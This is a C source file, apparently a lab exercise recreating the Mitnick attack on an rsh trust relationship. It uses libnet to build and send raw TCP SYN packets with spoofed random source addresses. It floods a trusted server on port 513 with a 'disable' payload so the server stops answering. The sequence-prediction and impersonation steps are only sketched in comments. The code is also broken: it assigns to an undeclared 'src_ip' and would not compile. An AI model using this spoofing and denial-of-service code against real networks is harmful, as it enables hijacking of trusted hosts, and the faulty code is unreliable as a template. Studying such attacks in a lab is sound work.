#include <libnet.h>
#include <stdio.h>
#include <stdlib.h>
#include <common.h>
#include <unistd.h>


//eth level data -> do I need this??
#define KEVIN_MAC "02:00:ac:10:10:02"
#define SERVER_MAC "02:00:ac:10:10:03"
#define XTERMINAL_MAC "02:00:ac:10:10:04"

//ip level data
#define KEVIN_IP "172.16.16.2"
#define SERVER_IP "172.16.16.3"
#define XTERMINAL_IP "172.16.16.4"

//tcp level data
#define PORT 513
#define PAYLOAD_DOS "disable"
#define PAYLOAD_RST "enable"

//function definitions
int send_syn(uint16_t dest_port, const uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip);

//shimomura you're doomed
int main (void)
{
	//initialize libnett stuff
	char e_buff[LIBNET_ERRBUF_SIZE];
	libnet_t * l;

	l = libnet_init(LIBNET_RAW4, "eth0", e_buff);
	if (l == NULL)
	{
		printf("libnet init error\n");
		exit(EXIT_FAILURE);
	}

	//start DOS part
	//ip conversion
	u_long server_ip = libnet_name2addr4(l, SERVER_IP, LIBNET_DONT_RESOLVE);
	u_long kevin_ip = libnet_name2addr4(l, KEVIN_IP, LIBNET_DONT_RESOLVE);

	if (server_ip == -1)
	{
		printf("error in server ip conversion\n");
		exit(EXIT_FAILURE);
	}
	if (kevin_ip == -1)
	{
		printf("error in kevin ip conversion\n");
		exit(EXIT_FAILURE);
	}

	//dos the server
	char disable[] = "disable";
	for (int i = 0; i < 10; i++)
	{
		//craft and send 10 packets with "disable" payload
		int success = send_syn(PORT, disable, 8, l, server_ip);
	}
	//now the server will ignore syn acks, that's exactly what I need because

	//I will send spoofed syn
	//The xterminal will send real synack to the server
	//I will respond with spoofed ack cause I know the server seq num
	//will have a trusted connection on the xterminal

	//contact xterminal to figure out next seq #


	//impersonate trusted server


	exit(EXIT_SUCCESS);
}


int send_syn(uint16_t dest_port, const uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip)
{

	libnet_ptag_t t;
	//build syn
	t = libnet_build_tcp(
		libnet_get_prand(LIBNET_PRu16), //sp source port
		dest_port,											//dp destinatin port
		libnet_get_prand(LIBNET_PRu32), //sequence number
    libnet_get_prand(LIBNET_PRu32), //ack number, can I send whatever?
    TH_SYN,													//control bit SYN
		libnet_get_prand(LIBNET_PRu16), //window size, random is ok?
		0,															//checksum, if 0 libnet autofills
		0,															//urgent pointer ???
		LIBNET_TCP_H + payload_s,				//len = tcp header + payload size
		payload,												//payload
		payload_s,											//payload size
		l,															//pointer to libnet context
		0																//protocol tag, 0 to build a new one
	);

	if (t == -1)
	{
		printf("error while crafting tcp syn\n");
		exit(EXIT_FAILURE);
	}

	//build ip fragment containing syn
	t = libnet_build_ip(
		LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, //size of the ip packet ,
		0,																				//tos, type of service
		libnet_get_prand(LIBNET_PRu16),						//id, ip identification
		0,																				//fragmentation bits and offset
		libnet_get_prand(LIBNET_PR8),							//ttl
    IPPROTO_TCP,															//upper protocol
    0,																				//checksum, 0 to autofill
    src_ip = libnet_get_prand(LIBNET_PRu32),	//src, I use a random fake ip
    server_ip,																//destination
    NULL,																			//payload
    0,																				//payload len
		l,																				//libnet context
		0																					//protocol tag
	);

	if (t == -1)
	{
		printf("error while crafting ip header\n");
		exit(EXIT_FAILURE);
	}

	//send packet
	int success = libnet_write(l);
	if (success == -1)
	{
		printf("error while sending packet\n");
		exit(EXIT_FAILURE);
	}

	return 1;
}
